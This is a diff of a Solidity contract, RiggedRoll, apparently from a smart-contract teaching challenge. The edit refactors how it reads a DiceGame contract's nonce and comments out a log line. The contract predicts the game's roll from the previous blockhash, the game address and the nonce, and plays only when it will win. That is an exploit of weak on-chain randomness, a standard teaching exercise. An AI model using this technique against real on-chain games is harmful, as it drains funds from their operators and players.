@@ -19,10 +19,6 @@ contract RiggedRoll is Ownable {
         payable(_addr).transfer(_amount);
     }
 
-    function getNonce() public view returns (uint256) {
-        return diceGame.getNonce();
-    }
-
     //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
     /**
      * @dev Predicts the exact roll number of DiceGame, copy the exact way the roll number is generated
@@ -36,14 +32,14 @@ contract RiggedRoll is Ownable {
 
         bytes32 prevHash = blockhash(block.number - 1);
         bytes32 hash = keccak256(
-            abi.encodePacked(prevHash, address(diceGame), diceGame.getNonce())
+            abi.encodePacked(prevHash, address(diceGame), diceGame.nonce())
         );
         uint256 roll = uint256(hash) % 16;
 
         console.log("\t", "   Rigged Roll:", roll);
         console.log("\t", "   Riggedprev blockNumber:", block.number - 1);
         console.log("\t", "   Rigged hash:", uint256(hash));
-        console.log("\t", "   Rigged hash:", diceGame.getNonce());
+        //console.log("\t", "   Rigged hash:", diceGame.nonce());
 
         //return if not a winner
         if (roll > 2) {
